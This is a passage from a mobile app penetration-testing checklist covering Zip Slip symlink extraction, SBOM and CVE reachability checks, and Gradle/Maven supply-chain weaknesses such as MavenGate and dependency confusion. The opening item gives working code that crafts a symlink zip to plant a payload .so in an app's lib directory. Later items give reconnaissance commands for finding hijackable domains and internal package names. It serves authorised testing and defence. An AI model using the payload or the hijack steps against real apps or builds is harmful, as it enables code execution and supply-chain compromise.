| **Maps to** | HackTricks *insecure-in-app-update-rce* ("Zip Slip path traversal while extracting plugins … Also test symlink entries and non-empty destination directories; canonical-path checks only help if extraction happens inside a fresh app-private directory") |

- **Test:** A canonical-path check defeats `../` but not a **symlink entry**: the archive creates
  `a/link -> /data/data/com.target.app/files/lib` and a later entry writes through it. And a canonical
  check that resolves against a destination directory which already contains attacker-placed entries is
  not a check at all — it must run against a freshly created private directory.
- **How:**
  ```python
  import zipfile
  z = zipfile.ZipFile('sym.zip', 'w')
  zi = zipfile.ZipInfo('a/link')
  zi.create_system = 3                       # UNIX
  zi.external_attr = (0xA000 | 0o777) << 16  # symlink mode
  z.writestr(zi, '/data/data/com.target.app/files/lib')
  z.writestr('a/link/libpwn.so', open('payload.so','rb').read())
  z.close()
  ```
  ```bash
  adb shell run-as com.target.app ls -l files/lib/
  ```
  Also check the extraction destination: is it `File.createTempFile`/a fresh `getDir()`, or a stable
  directory that survives between runs?
- **Proof:** A file materialising at the symlink's target, or extraction succeeding into a directory whose
  contents you pre-placed.
- **Escalation:** → D17-013 (the `.so` landing).
- **Ruled out when:** The extractor rejects entries whose mode indicates a symlink (or uses an API that
  cannot create them) **and** extracts into a freshly created directory it owns, deleted on each run.

### D17-059 · Generate the SBOM from the shipped binary, then scan it

| | |
|---|---|
| **Severity ceiling** | Medium (an undeclared bundled component is itself a control failure); otherwise Support |
| **VRT** | n/a for the SBOM; each hit inherits its own node after D17-060 |
| **Attacker** | n/a (tester step) |
| **Applies to** | all; source-side half needs repo access, binary-side half does not |
| **Maps to** | MASTG-TEST-0274 (Dependencies with Known Vulnerabilities in the App's SBOM), MASTG-TECH-0130 (SCA by Creating an SBOM), MASTG-TOOL-0134 (cdxgen), MASTG-TOOL-0132 (dependency-track), MASTG-TOOL-0130 (blint), MASTG-TEST-0272, MASTG-TECH-0131, MASTG-TOOL-0131 (dependency-check); MASWE-0044; MASVS-CODE-3 |

- **Test:** Scanning `node_modules` or a lockfile proves nothing about a DEX plus ARM64 binary. Produce
  **two** SBOMs — source-side (authoritative for coordinates) and binary-side (authoritative for what
  shipped) — and reconcile them. The reconciliation is the finding, not the scan.
- **How:**
  ```bash
  # binary side — works black-box
  syft target.apk -o cyclonedx-json=apk-sbom.json
  cdxgen -t android -o apk-sbom.json .
  blint -i target.apk
  # source side, when you have the repo
  ./gradlew :app:cyclonedxBom
  ./gradlew :app:dependencies --configuration releaseRuntimeClasspath > deps.txt
  # consume
  osv-scanner scan -r ./android-project/ --format json --output-file osv.json
  osv-scanner scan -L gradle/verification-metadata.xml
  osv-scanner scan --all-packages --format=json ./android-project/
  # or dependency-track, per MASTG-TEST-0274
  curl -X PUT "http://localhost:8081/api/v1/bom" \
    -H 'Content-Type: application/json' -H 'X-API-Key: <API KEY>' \
    -d '{"project":"<PROJECT ID>","bom":"'"$(base64 -w0 apk-sbom.json)"'"}'
  ```
  Then add the module-level `build.gradle` plugin if you have source and the client wants a repeatable
  control:
  ```groovy
  plugins { id("org.owasp.dependencycheck") version "12.1.1" }
  dependencyCheck {
      formats = listOf("HTML", "XML", "JSON")
      nvd { apiKey = "<YOUR NVD API KEY>"; delay = 16000 }
      suppressionFile = "suppression.xml"
  }
  ```
  ```bash
  ./gradlew dependencyCheckAnalyze     # reports land in app/build/reports/
  ```
- **Proof:** A reconciliation table with a non-empty **"in source SBOM but not in APK"** column (dead
  weight → lower severity, and a useful argument against a scanner's noise) and a non-empty **"in APK but
  not in source SBOM"** column (undeclared/bundled/vendored code → the supply-chain finding). Keep the PURL
  strings (`pkg:maven/<group>/<artifact>@<version>`) — triagers accept them as the version assertion.
- **Escalation:** Every hit goes through D17-060 before it becomes a finding.
- **Ruled out when:** Both SBOMs reconcile with no unexplained component in either direction and
  `osv-scanner` returns no advisory for the reconciled list. Note the known issues so a clean result is
  credible: dependency-check through 12.1.1 can throw `NoSuchMethodError` on `ZipFile.builder()` (pin
  `org.apache.commons:commons-compress`), NVD CPE matching produces AndroidX/support-library false
  positives, and dependencies resolve to `~/.gradle/caches/modules-2/files-2.1`, not the project dir.

### D17-060 · Prove reachability before filing any dependency CVE — the closed-informative killer

| | |
|---|---|
| **Severity ceiling** | This is not a finding — it is the multiplier that turns a P5 informative into the sink's real severity |
| **VRT** | without it, `using_components_with_known_vulnerabilities.outdated_software_version` (**P5**), every time |
| **Attacker** | n/a (tester step) |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0129 (Verifying Android Dependencies at Runtime — explicitly the black-box-only fallback: "manual and cannot easily be automated"); the Jackson CVE-criteria wiki as the formalised version of the same logic; Project Zero's CVE-2022-2294 RCA ("the bug is only reachable in applications that use SDP munging") |

- **Test:** For each CVE hit, demonstrate (a) the vulnerable class/method survived R8 into `classes*.dex`
  or the vulnerable version string is in `lib/`, and (b) attacker-controlled input reaches it. Without
  both, expect "Informative" — and you will deserve it.
- **How:**
  ```bash
  # (a) did the symbol survive shrinking?
  for d in $(unzip -Z1 target.apk 'classes*.dex'); do unzip -p target.apk "$d" > /tmp/$d; done
  dexdump -d /tmp/classes*.dex | grep -n "Lcom/squareup/okhttp3/internal/tls/OkHostnameVerifier;->verify"
  jadx -d out target.apk && grep -rn "writeBitmapToUri\|SplitCompat.install\|enableDefaultTyping" out/sources/
  # (b) walk callers up in jadx-gui: Find Usage (Ctrl+Shift+X) until you reach one of
  #     onCreate/onNewIntent, onReceive, shouldOverrideUrlLoading/@JavascriptInterface,
  #     openFile/query, or a network-response parser
  # (c) confirm the frame is actually entered
  frida -U -f com.target.app -l reach.js
  ```
  ```javascript
  // reach.js — prove the sink executes, dump the argument and the stack that got there
  Java.perform(function () {
    var C = Java.use('com.vendor.sdk.VulnClass');          // swap for your sink
    C.vulnMethod.overloads.forEach(function (o) {
      o.implementation = function () {
        console.log('[REACHED] args=' + JSON.stringify(Array.prototype.slice.call(arguments).map(String)));
        console.log(Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
        return o.apply(this, arguments);
      };
    });
  });
  ```
- **Proof:** Three artefacts in the report: the `dexdump`/jadx line showing the symbol present, the jadx
  Find-Usage chain from an exported entry point down to the sink, and the Frida `[REACHED]` log with the
  attacker-supplied value visible in `args`.
- **Escalation:** With reachability, file the bug under **its actual effect** (RCE, path traversal, file
  read), not under the known-vulnerabilities branch — that is what moves it off P5.
- **Ruled out when:** The vulnerable symbol is absent from the DEX (R8 stripped it), or no caller chain
  exists from any attacker-reachable entry point. State which, per CVE, in the ruled-out register: e.g.
  "`okhttp 4.9.0` carries CVE-2021-0341, but the app installs no custom `HostnameVerifier` and pins nothing,
  so the impact caps at Low; not filed."

### D17-061 · Fingerprint library versions that R8 stripped the marker from

| | |
|---|---|
| **Severity ceiling** | Low alone — it is the *evidence* that makes every version-based finding survive triage |
| **VRT** | n/a |
| **Attacker** | n/a (tester step) |
| **Applies to** | all; essential for R8/ProGuard-obfuscated release builds |
| **Maps to** | LibScout README — profile/match commands, hashtree (Merkle) profiles built from original `.jar`/`.aar` SDKs, obfuscation resilience via identifier-independent structure, similarity scoring to an exact version or a 2–3 candidate set, `[SECURITY]`/`[SECURITY-FIX]` tags; its shipped vulnerable set includes OkHttp 2.1–2.7.4 and 3.0.0–3.1.2 (pinning bypass, fixed 2.7.5 / 3.2.0), Apache Commons Collections 3.2.1 / 4.0 (deserialization, fixed 3.2.2 / 4.1), Dropbox SDK 1.5.4–1.6.1 (fixed 1.6.2). MASTG-KNOW-0004; MASTG-TOOL-0022 (ProGuard obfuscates version info away) |

- **Test:** When `META-INF/*.version` and `BuildConfig` are gone you still owe the triager a version. Use
  bytecode-structure fingerprinting, not package names — R8 renames those.
- **How:**
  ```bash
  unzip -l target.apk | grep -E 'META-INF/.*\.version|\.properties'
  unzip -p target.apk 'META-INF/*.version'
  jadx --no-src -d out target.apk
  grep -rn 'version\|VERSION\|BuildConfig' out/resources/ | grep -iE 'okhttp|retrofit|glide|gson|jackson|sqlcipher|exoplayer|realm'
  # structural fingerprinting when the above is empty
  java -jar LibScout.jar -o profile -a android.jar -x lib.xml okhttp-4.9.1.aar
  java -jar LibScout.jar -o match -p ./profiles -a android.jar -u -j ./json target.apk
  ```
- **Proof:** The LibScout JSON naming the library and a version (or a 2–3 candidate set) with its similarity
  score — this is the artefact that answers "prove it is actually 4.9.1 and not 4.12.0".
- **Escalation:** A confirmed version unlocks the CVE items in D10/D12/D14/D16 and D17-060.
- **Ruled out when:** Not applicable as a negative — record the version evidence you have, or record that
  you could not establish one and that no version-based finding was filed as a result.

### D17-062 · Version-fingerprint every bundled `.so`, including engine-vendored parsers

| | |
|---|---|
| **Severity ceiling** | Per advisory, and only with a reachability argument (which JNI entry point feeds this parser?) |
| **VRT** | rate on the demonstrated sink; version alone is `using_components_with_known_vulnerabilities.outdated_software_version` (P5) |
| **Attacker** | AM-02 (a crafted file through the app's own feature) / AM-09 |
| **Applies to** | all apps with `lib/*.so`; Unity, Flutter and any engine with vendored native dependencies |
| **Maps to** | LibRARIAN / *"Too Quiet in the Library"* — version strings from `.rodata` with the regexes below, plus five ELF metadata features matched by Jaccard similarity at 0.85; **91.15% correct version identification (824/904)**; **53 of the top 200 Google Play apps (26.5%) carried a vulnerable native library**; vulnerable libraries averaged **859.17 ± 137.55 days** out of date while library developers shipped patches in **54.59 ± 8.12 days** and app developers took **528.71 ± 40.20 days** to adopt them. Google Play ASI **libpng** and **libjpeg-turbo** campaigns (2016-06-16). MHL's Unity/FreeType table for **CVE-2025-27363**: 2021.3.x (EOL) bundles 2.12.1, vulnerable with no patch planned; 2022.3 < 62f1 bundles ≤ 2.13.0, vulnerable; 2022.3.62f1+ and 6000.0.47f1+ bundle 2.13.3, patched — and MHL's note that Flutter on iOS is not affected by that CVE but bundles its own HarfBuzz and remains exposed to **AIKIDO-2026-10356**. Also **CVE-2023-4863** (libwebp), **CVE-2022-2294 / CVE-2023-7024 / CVE-2024-5493** (WebRTC) |

- **Test:** Native libraries are the least-patched part of an Android app and are invisible to
  Maven-coordinate SCA by construction. Game and cross-platform engines statically link their own copies of
  system libraries, so an OS patch does nothing for them — the "10× patch lag" numbers above are the
  strongest argument you have that a native-lib finding is real.
- **How:**
  ```bash
  unzip -o target.apk 'lib/*' -d x
  for so in $(find x/lib -name '*.so'); do
    echo "=== $so"
    strings -a "$so" | grep -aoE 'ffmpeg-([0-9]\.)*[0-9]|openssl-1(\.[0-9])*[a-z]|OpenSSL 1\.[0-9]\.[0-9][a-z]?|^3\.([0-9]{1,}\.)+[0-9]|libpng version [0-9.]+|libjpeg-turbo [0-9.]+|zlib [0-9.]+|libxml2-[0-9.]+|GIFLIB [0-9.]+|WebP [0-9.]+|FreeType [0-9.]+|HarfBuzz [0-9.]+' | sort -u
    readelf -d "$so" | grep -E 'NEEDED|SONAME'
  done
  # engine identification
  ls x/lib/*/ | grep -iE 'unity|il2cpp|flutter|hermes|jsc|webrtc|jingle|peerconnection'
  # JNI entry points that could feed a vulnerable parser
  for so in x/lib/arm64-v8a/*.so; do nm -D --defined-only "$so" 2>/dev/null | grep ' T Java_' | head -40; done
  ```
- **Proof:** A table of `.so path | library | version string | matching advisory`. The raw `strings` line is
  the citable evidence. Then the reachability half: a JNI entry point hooked and fired by input the attacker
  supplied (a crafted font, image or media file delivered through a `content://` share or a deeplink), plus
  a tombstone if you get a crash.
- **Escalation:** → D16 for crash triage; → D19 for the engine-version remediation argument. Distinguish
  Mainline/APEX components (fixable via Google Play system updates, `/apex/com.android.*`) from base-image
  ones — FreeType is not a Mainline module and has no delivery path for EOL devices, which raises
  real-world severity.
- **Ruled out when:** No version string resolves to a vulnerable range, **or** the vulnerable parser has no
  JNI entry point reachable from app input — name the entry points you enumerated.

### D17-063 · MavenGate — a groupId whose publisher domain is purchasable

| | |
|---|---|
| **Severity ceiling** | High (Critical where you can demonstrate it in a lab you own) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) is where it lands if demonstrated; most bounty programmes scope the build pipeline out, so check scope before spending time here |
| **Attacker** | AM-01 (an unauthenticated third party needs only a credit card) |
| **Applies to** | all Gradle/Maven-built Android apps; needs source access or a published dependency list |
| **Maps to** | Oversecured *"Introducing MavenGate"* — groupId ownership proved via a DNS TXT record on the reversed domain (publishing under `com.google.code.gson` requires a TXT record for `gson.code.google.com`); affected repositories **Maven Central, JitPack, JCenter** and "All Maven-based technologies including Gradle"; steps: identify an abandoned dependency → buy the expired domain or claim the free GitHub username → register the groupId → publish a rogue artifact; on resolution, "newer version numbers trigger updates *regardless of the position* of repositories in the declaration list"; **statistics: 26,163 domains mapped from Maven Central groupIds, 3,710 (14.18%) purchasable; 7,523 GitHub-based projects, 291 (3.86%) vulnerable; with private repositories, 33,938 domains and 6,170 (18.18%) vulnerable**; top abandoned dependencies by share of vulnerable cases included `co.fs2` (10.63%), `net.jpountz.lz4` (4.21%), `org.mvel` (3.60%), `org.tpolecat` (3.29%), `com.opencsv` (3.11%); "Most applications do not check the digital signature of dependencies, and many libraries do not even publish it", including "a huge number of unsigned dependencies from Google"; reports went to 200+ companies including Google, Facebook, Signal and Amazon. MASWE-0044, MASWE-0048 |

- **Test:** Maven `groupId`s are reverse domains and repositories prove ownership by DNS TXT. If a
  dependency's groupId maps to an expired domain — or an `io.github.<user>` coordinate whose GitHub username
  is free — anyone can claim it and publish a **higher version**, which Gradle prefers regardless of
  repository order.
- **How:**
  ```bash
  ./gradlew :app:dependencies --configuration releaseRuntimeClasspath > deps.txt
  # groupIds -> candidate domains (reverse the leading segments)
  grep -oE '^[|+\\ -]*[a-z0-9.]+:[a-zA-Z0-9._-]+:' deps.txt | sed 's/[|+\\ -]*//' | cut -d: -f1 \
    | sort -u > groups.txt
  python3 - <<'PY' > domains.txt
  for g in open('groups.txt'):
      p = g.strip().split('.')
      if len(p) >= 2:
          print('.'.join(reversed(p[:2])))
  PY
  # registration status — count your results, do not trust a shell loop (see D17-080)
  python3 - <<'PY'
  import subprocess
  ds = [d.strip() for d in open('domains.txt') if d.strip()]
  hits = 0
  for d in ds:
      try:
          out = subprocess.run(['whois', d], capture_output=True, text=True, timeout=20).stdout
          free = any(s in out.lower() for s in ('no match', 'not found', 'no data found'))
          print(('AVAILABLE ' if free else 'registered ') + d); hits += 1
      except Exception as e:
          print('ERROR     ' + d + ' ' + repr(e))
  print('checked %d of %d' % (hits, len(ds)))
  PY
  # does the artifact even ship a signature?
  curl -sI "https://repo1.maven.org/maven2/<g/path>/<artifact>/<ver>/<artifact>-<ver>.jar.asc" | head -1
  # would the build notice a swap?
  ls gradle/verification-metadata.xml 2>/dev/null || echo "NO dependency verification configured"
  # free GitHub usernames behind io.github coordinates
  grep -oE 'io\.github\.[a-z0-9-]+' deps.txt | sort -u | while read c; do
    u=${c#io.github.}; printf "%s " "$u"; curl -s -o /dev/null -w "%{http_code}\n" "https://github.com/$u"
  done
  ```
- **Proof:** Three artefacts together: (a) a dependency whose publisher domain returns `AVAILABLE` in whois
  (or an `io.github` username returning 404), (b) a `404` for its `.jar.asc`, and (c) no
  `verification-metadata.xml` in the repo. **Do not actually register the domain or publish an artifact.**
- **Escalation:** A malicious artifact executes at build time (as a plugin) or at runtime (as a library) in
  every user's app — the maximal supply-chain outcome. The remediation line:
  `./gradlew --write-verification-metadata pgp,sha256 --export-keys` committed; pin exact versions; order
  trusted repositories first; replace abandoned groupIds; keep your own groupId's domain registered.
- **Ruled out when:** Every groupId in the release runtime classpath maps to a domain registered to the
  library's actual maintainer (or to a `io.github` username that resolves), **or** the build enforces
  `verification-metadata.xml` with trusted keys and no blanket `<trust group>` entries. JCenter is
  read-only/sunset but still referenced in old `build.gradle` files — grep for `jcenter()` specifically.

### D17-064 · Dependency confusion against internal coordinates

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the build compromise; the leaked internal coordinate alone is `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) |
| **Attacker** | AM-01 (needs only the coordinate name) |
| **Applies to** | all builds mixing internal and public repositories, version-catalog (`libs.versions.toml`) builds included |
| **Maps to** | Gradle/Android repository content-filtering guidance (`maven { url "https://jitpack.io"; content { includeGroup "com.example"; includeModule("com.example","foo"); excludeGroupByRegex("dev\\.spght\\..*") } }`, with the stated limitation that filtering "does not verify dependencies themselves are legitimate — use alongside checksum verification"); Android "Gradle dependency resolution" / "Dependency verification" docs; H1 #1763343 (`hyperledger/aries-mobile-agent-react-native`, $0); H1 #1439355 (Shopify `unity-buy-sdk` GitHub action takeover) |

- **Test:** If the build lists a public repository alongside an internal one **without content filtering**,
  an attacker who learns an internal coordinate publishes a higher version publicly and wins resolution.
  The disclosed bounty outcomes here are low ($0 in both cited reports) — file it where the coordinate
  actually ships into the app, and be realistic about scope.
- **How:**
  ```bash
  grep -rn -A8 'repositories' build.gradle build.gradle.kts settings.gradle settings.gradle.kts \
    | grep -nE 'mavenCentral|google\(\)|jcenter|maven \{|url|content \{|includeGroup|excludeGroup|exclusiveContent'
  awk '/--- /{print $2}' deps.txt | grep -iE '^com\.(client|internal|corp)' | sort -u
  # confirm the leak empirically, on a build you are authorised to run
  ./gradlew --refresh-dependencies help \
    -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080 -Dhttps.proxyHost=127.0.0.1 -Dhttps.proxyPort=8080
  # black-box variant: mine internal names out of the shipped artifact
  strings -a out/classes*.dex | grep -oE 'com\.<client>\.[a-z0-9.]+' | sort -u | head -50
  grep -rIn '"name"\s*:' out/assets/*.json 2>/dev/null | head
  npm view <internal-package-name>        # exists publicly == already claimed; 404 == claimable
  ```
- **Proof:** Proxy log lines showing internal coordinates requested from a **public** host — that alone is
  both the information-disclosure finding and the confusion precondition. For the black-box variant, a
  registry query showing the name is unregistered publicly while being referenced internally. **Do not
  publish a package.**
- **Escalation:** Same as MavenGate — build RCE, signing-key theft, trojanised release.
- **Ruled out when:** Every internal coordinate is fenced with `exclusiveContent`/`includeGroup` to the
  internal repository **and** the proxy run shows no internal coordinate requested from a public host.

### D17-065 · `pluginManagement` content filters silently ignored (LEGACY)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | **LEGACY — Gradle 5.1 through 6.8.3 only**, fixed in 7.0. Still routinely present in long-lived enterprise Android repos |
| **Maps to** | **GHSA-jvmj-rh6q-x395 / CVE-2021-29427** — `content { includeGroup … }` / `exclusiveContent` filters inside a `settings.gradle` `pluginManagement {}` block are ignored; CVSS **8.0**, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere); impacts: information disclosure of internal package identifiers and dependency confusion/poisoning via name squatting |

- **Test:** On those Gradle versions, the filter that the team believes confines internal **plugin**
  coordinates to the internal repository does nothing, and a squatted public plugin can be resolved instead.
  A plugin executes in the build with full CI privileges.
- **How:**
  ```bash
  ./gradlew --version
  grep -n -A15 'pluginManagement' settings.gradle settings.gradle.kts 2>/dev/null \
    | grep -nE 'content|includeGroup|exclusiveContent'
  ./gradlew --refresh-dependencies help -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080
  ```
- **Proof:** Gradle version in the affected range **and** a proxy log showing an internal plugin coordinate
  (`com.client.internal.*`) hitting `plugins.gradle.org` or `repo.maven.apache.org` despite the
  `includeGroup` filter.
- **Escalation:** Attacker-controlled Gradle plugin = arbitrary code in CI with the upload keystore and the
  Play publishing service account in reach (→ D17-068).
- **Ruled out when:** Gradle `≥ 7.0`, or no `content`/`exclusiveContent` filter is relied on inside
  `pluginManagement`.

### D17-066 · Gradle dependency verification — absent, or present and bypassed

| | |
|---|---|
| **Severity ceiling** | Medium — a missing/neutered integrity control on the path that produces the signed release binary |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES). Argue impact via D17-063/064, never in the abstract |
| **Attacker** | AM-01 (as the enabler) |
| **Applies to** | Gradle builds; the bypass variant is **Gradle 6.2 through 7.4.2**, fixed in 7.5 |
| **Maps to** | Gradle dependency-verification userguide (`--write-verification-metadata sha256\|sha256,pgp`, `--dry-run`, modes `strict`/`lenient`/`off`, `<trusted-key>`, `<trusted-artifacts>`, and that **SNAPSHOTs are not verified** because "checksums change constantly"); Android docs (`./gradlew --write-verification-metadata pgp,sha256 --export-keys help`, the `<trusted-key id="…"><trusting group="androidx.activity"/></trusted-key>` output shape, `keyring-format`, `key-servers enabled="false"`); **GHSA-j6wc-xfg8-jx2j** — an entry with a `gpg` element but no `checksum` element is accepted without validation whenever signature verification cannot be completed; patched in 7.5 by "making sure to run checksum verification if signature verification cannot be completed, whatever the reason" |

- **Test:** Absence of `gradle/verification-metadata.xml` means every dependency and every plugin is
  accepted on trust from whichever repository answered first. Presence is not enough either: blanket
  `<trust group="…"/>` entries disable verification for everything they match, a large `<ignored-key>` count
  means keys could not be found, and on 6.2–7.4.2 a `gpg`-only entry verifies nothing on fallback.
- **How:**
  ```bash
  ls -l gradle/verification-metadata.xml gradle/verification-keyring.keys 2>/dev/null || echo "NO VERIFICATION"
  ./gradlew --version | grep -i '^Gradle'
  ./gradlew --write-verification-metadata pgp,sha256 --export-keys help
  grep -c '<ignored-key' gradle/verification-metadata.xml     # keys not found on keyservers
  grep -n '<trust '      gradle/verification-metadata.xml     # blanket trust entries
  python3 - <<'PY'
  import re
  x = open('gradle/verification-metadata.xml').read()
  for m in re.finditer(r'<artifact name="([^"]+)">(.*?)</artifact>', x, re.S):
      body = m.group(2)
      if ('pgp' in body or 'gpg' in body) and 'sha' not in body:
          print("UNVERIFIED-ON-FALLBACK:", m.group(1))
  PY
  ```
- **Proof:** Either the file is absent, or you quote the exact lines: a broad `<trust group="com.mycompany"/>`
  ("automatically trusts all artifacts in that group without validation — disabling verification entirely
  for matched components"), a high `<ignored-key>` count, or a `UNVERIFIED-ON-FALLBACK` artefact on a
  6.2–7.4.2 build.
- **Escalation:** This is the control whose absence makes D17-063 and D17-064 exploitable against *this*
  client. Chain the impact story there.
- **Ruled out when:** `verification-metadata.xml` exists in `strict` mode, with no blanket `<trust group>`,
  a zero or explained `<ignored-key>` count, every artifact carrying a checksum as well as any signature,
  and Gradle `≥ 7.5`.

### D17-067 · Version ranges, `+`, `latest.release` and `SNAPSHOT`

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High combined with a hijackable groupId — the dynamic version is what makes the "publish a higher version" step automatic |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) as the control failure; chain to D17-063 for impact |
| **Attacker** | AM-01 |
| **Applies to** | all Gradle builds |
| **Maps to** | Oversecured MavenGate (higher versions win "regardless of the position" of repositories); Gradle dependency-verification docs (SNAPSHOTs are **not** verified); the real-world coordinate `com.theartofdev.edmodo:android-image-cropper:2.8.+` |

- **Test:** A dynamic version means the build output is not reproducible and anyone who can publish *any*
  higher version into *any* configured repository silently wins. SNAPSHOTs are additionally exempt from
  Gradle's verification.
- **How:**
  ```bash
  grep -rnE "['\"][^'\"]+:[^'\"]+:[^'\"]*(\+|latest\.(release|integration)|\[[^]]+\]|SNAPSHOT)['\"]" \
    --include='*.gradle' --include='*.gradle.kts' --include='*.toml' .
  grep -rn "SNAPSHOT" --include='*.gradle*' --include='*.toml' .
  ls gradle.lockfile app/gradle.lockfile 2>/dev/null || echo "NO DEPENDENCY LOCKING"
  ```
- **Proof:** The literal declaration, plus the absence of both a lockfile and `verification-metadata.xml`.
- **Escalation:** → D17-063 / D17-064.
- **Ruled out when:** Every coordinate is an exact version, a lockfile is committed, and no SNAPSHOT appears
  in a release configuration.

### D17-068 · Gradle plugins, the wrapper, and plaintext repositories — code that runs *in the build*

| | |
|---|---|
| **Severity ceiling** | **Critical** when the signing key is reachable from a build that resolves third-party plugins |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-01 / AM-06 (on the CI network, for the HTTP variant) |
| **Applies to** | all Gradle projects |
| **Maps to** | Gradle *"Protecting Project Integrity"* ("Inspect the build scripts and any contributed code before running any tasks"; wrapper checksum validation; `distributionSha256Sum` in `gradle-wrapper.properties`; `gradle :wrapper` regeneration from a known-good local distribution); the Plugin Portal defaults to HTTPS with manual inspection of new plugins; **GHSA-j6wc-xfg8-jx2j** impact section ("Man-in-the-middle attacks: HTTP-based downloads remain vulnerable to interception and replacement"); safeguard.sh ("a single malicious build.gradle file can run arbitrary commands on a developer laptop or a CI runner before a single test executes… exfiltrate environment variables (including CI secrets like signing keys and Play Store API tokens)"); ATT&CK T1474.001 (mitigation M1013) |

- **Test:** Build scripts are executable Groovy/Kotlin. Any plugin, wrapper jar or artefact resolved from an
  unvetted or plaintext source runs with full CI privileges **before** any test executes, with access to the
  upload keystore, `local.properties` and the Play publishing service account.
- **How:**
  ```bash
  grep -rn -A10 'buildscript' build.gradle build.gradle.kts | grep -nE 'repositories|maven|url|classpath'
  grep -rn -A10 'pluginManagement' settings.gradle settings.gradle.kts
  grep -rnE '^\s*(id|classpath)\b' build.gradle* settings.gradle* buildSrc/**/*.gradle* 2>/dev/null | sort -u
  # wrapper integrity
  sha256sum gradle/wrapper/gradle-wrapper.jar         # compare with Gradle's published checksums
  grep -n 'distributionUrl\|distributionSha256Sum' gradle/wrapper/gradle-wrapper.properties
  # plaintext repositories
  grep -rnE "maven[^\n]*\{[^}]*url[^}]*['\"]http://" --include='*.gradle' --include='*.gradle.kts' .
  grep -rn "allowInsecureProtocol\|isAllowInsecureProtocol" --include='*.gradle*' .
  # what secrets are in reach of a build script?
  ls -l local.properties keystore.properties *.jks *.keystore play-service-account*.json 2>/dev/null
  grep -rn "signingConfigs" -A10 app/build.gradle*
  ```
- **Proof:** A plugin coordinate resolved from a non-`plugins.gradle.org`, non-internal repository; a
  `gradle-wrapper.jar` whose SHA-256 matches no published Gradle release; a missing `distributionSha256Sum`;
  or an `http://` repository declaration — **plus** evidence that a build script can read the signing
  material (the `signingConfigs` block referencing `keystore.properties` in the repo or CI workspace).
- **Escalation:** Signing-key theft → a malicious update pushed under the client's real identity, which is
  strictly worse than any app-level RCE.
- **Ruled out when:** Every plugin resolves from the Plugin Portal or an internal mirror over HTTPS, the
  wrapper jar matches a published checksum with `distributionSha256Sum` pinned, no `http://` repository is
  declared, and signing material is injected by the CI secret store rather than being readable from the
  workspace.

### D17-069 · Duplicate-class shadowing (Maven-Hijack) in the release classpath

| | |
|---|---|
| **Severity ceiling** | High when the shadowed class is security-relevant (a verifier, a signer, a crypto helper) |
| **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (VARIES); `server_side_injection.remote_code_execution_rce` (P1) chained with D17-063 |
| **Attacker** | AM-01 / AM-08 |
| **Applies to** | all Gradle/JVM builds |
| **Maps to** | Gradle blog *"Detecting Maven-Hijack-style risks in Gradle builds with the Dependency Analysis Gradle Plugin"* — DAGP 3.5.0+, `buildHealth`/`reason`/`fixDependencies`, three risk categories (no duplicates / identical duplicates / **incompatible duplicates**) |

- **Test:** Two dependencies provide the same fully-qualified class; the classloader takes the first on the
  classpath. An attacker who controls an *earlier* dependency shadows a class belonging to a *later*,
  trusted one without touching app code — silent behaviour substitution inside the app's own process.
- **How:**
  ```kotlin
  // settings.gradle.kts
  plugins { id("com.autonomousapps.build-health") version "3.5.1" }
  ```
  ```kotlin
  // root build.gradle.kts
  dependencyAnalysis { issues { all { onAny { severity("fail") } } } }
  ```
  ```bash
  ./gradlew buildHealth
  ./gradlew :app:reason --id :suspect-lib
  ```
- **Proof:** A `buildHealth` entry flagging **binary-incompatible** duplicate classes, e.g.
  `Expected METHOD com/example/trusty/TrustyService.greet(Ljava/lang/String;)Ljava/lang/String;, but was
  com/example/trusty/TrustyService.greet(Ljava/lang/String;)I`. Identical duplicates are merely redundant;
  incompatible duplicates are the attack signal.
- **Escalation:** Combine with D17-063 — hijack the *earlier* groupId, ship the shadowing class, done.
- **Ruled out when:** `buildHealth` reports no duplicates, or only identical ones, on the release runtime
  classpath.

### D17-070 · One library, several groupIds — the SCA blind spot

| | |
|---|---|
| **Severity ceiling** | Medium as a process finding; it is the argument that defeats "our scanner says we're clean" |
| **VRT** | n/a for the process finding; whatever bug you then demonstrate carries the rating |
| **Attacker** | n/a (tester step) |
| **Applies to** | all; especially any library with a community fork |
| **Maps to** | the Android-Image-Cropper family — `com.theartofdev.edmodo` → `com.github.arthurhub` (repository "NOT currently maintained", development halted at 2.8.0) → `com.canhub` → `com.vanniktech`; "an SCA rule keyed on one groupId sees at most a third of this family"; "Blacklisting one allows the vulnerable code to arrive via JitPack mirrors or archived forks" |

- **Test:** An SCA rule keyed on one `groupId` sees only a fraction of a forked library family. Search for
  *all* known coordinates and for JitPack mirrors of archived forks — then check at class level, which
  survives coordinate renaming entirely.
- **How:**
  ```bash
  grep -rniE "com\.theartofdev|com\.github\.arthurhub|com\.canhub|com\.vanniktech" \
    --include='*.gradle' --include='*.gradle.kts' --include='*.toml' .
  grep -rn "jitpack.io" --include='*.gradle*' --include='settings.gradle*' .
  # class-level check
  jadx -d out target.apk && grep -rl "class CropImageActivity\|CropImageView" out/sources/
  ```
- **Proof:** A dependency declared under an archived or unmaintained coordinate, or the vulnerable class
  present in the DEX while the SCA report shows the library as "not present".
- **Escalation:** → D17-060 to prove the reachable bug, → D17-071 for the abandonment argument.
- **Ruled out when:** For every library family you checked, the class-level grep and the coordinate grep
  agree — list the families checked.

### D17-071 · Abandoned library with no advisory stream

| | |
|---|---|
| **Severity ceiling** | Low as inventory; the finding is whatever concrete bug you then demonstrate |
| **VRT** | rate the demonstrated bug; `using_components_with_known_vulnerabilities.outdated_software_version` (P5) if all you have is the abandonment |
| **Attacker** | n/a (tester step) |
| **Applies to** | all |
